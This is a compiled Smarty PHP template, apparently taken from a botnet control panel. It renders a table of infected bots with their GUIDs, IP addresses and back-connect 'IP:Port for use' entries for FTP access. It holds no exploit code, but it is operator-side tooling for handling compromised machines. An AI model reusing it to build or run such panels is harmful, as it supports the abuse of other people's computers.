<?php /* Smarty version Smarty-3.0.6, created on 2011-02-19 21:06:01
         compiled from "/var/www/maincp/client/templates/ftpbackconnect.tpl" */ ?>
<?php /*%%SmartyHeaderCode:4768498394d6030b9173742-86765725%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    '3a8079762d102ddfb343abf6131ab8e200306eb2' => 
    array (
      0 => '/var/www/maincp/client/templates/ftpbackconnect.tpl',
      1 => 1297729002,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '4768498394d6030b9173742-86765725',
  'function' => 
  array (
  ),
  'has_nocache_code' => false,
)); /*/%%SmartyHeaderCode%%*/?>
<h2><b>Server</b>: <?php echo $_smarty_tpl->getVariable('HOST')->value;?>
</h2>
<hr size='1' color='#CCCCCC'>

<table width="720px" cellspacing="0" cellpadding="0" border="1" style="border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;">

<th width='20px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>#</th>
<th width='480px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>Bot GUID</th>
<?php if (isset($_smarty_tpl->getVariable('SHOW_BOTS_IP',null,true,false)->value)){?>
	<th width='180px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>Bot Ip</th>
<?php }?>
<th width='220px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>IP:Port for use</th>


<?php  $_smarty_tpl->tpl_vars['REC'] = new Smarty_Variable;
 $_from = $_smarty_tpl->getVariable('CONT_ARR')->value; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array');}
if ($_smarty_tpl->_count($_from) > 0){
    foreach ($_from as $_smarty_tpl->tpl_vars['REC']->key => $_smarty_tpl->tpl_vars['REC']->value){
?>
<tr><td align='center'><?php echo $_smarty_tpl->tpl_vars['REC']->value['I'];?>
</td><td align='center'><?php echo $_smarty_tpl->tpl_vars['REC']->value['GUID'];?>
</td>
<?php if (isset($_smarty_tpl->getVariable('SHOW_BOTS_IP',null,true,false)->value)){?>
	<td align='center'><?php echo $_smarty_tpl->tpl_vars['REC']->value['IP'];?>
</td>
<?php }?>
<td align='center'><input readonly value='<?php echo $_smarty_tpl->tpl_vars['REC']->value['HOST'];?>
:<?php echo $_smarty_tpl->tpl_vars['REC']->value['PORT'];?>
' style='width: 140px; background: rgb(0,0,0); color: rgb(0,255,0);'></td><?php echo $_smarty_tpl->tpl_vars['REC']->value['SCGEO'];?>
</tr>
<?php }} else { ?>
<tr><td colspan='4' class='error' style='text-align:center;'>There are no FTPs</td></tr>
<?php } ?>

</table>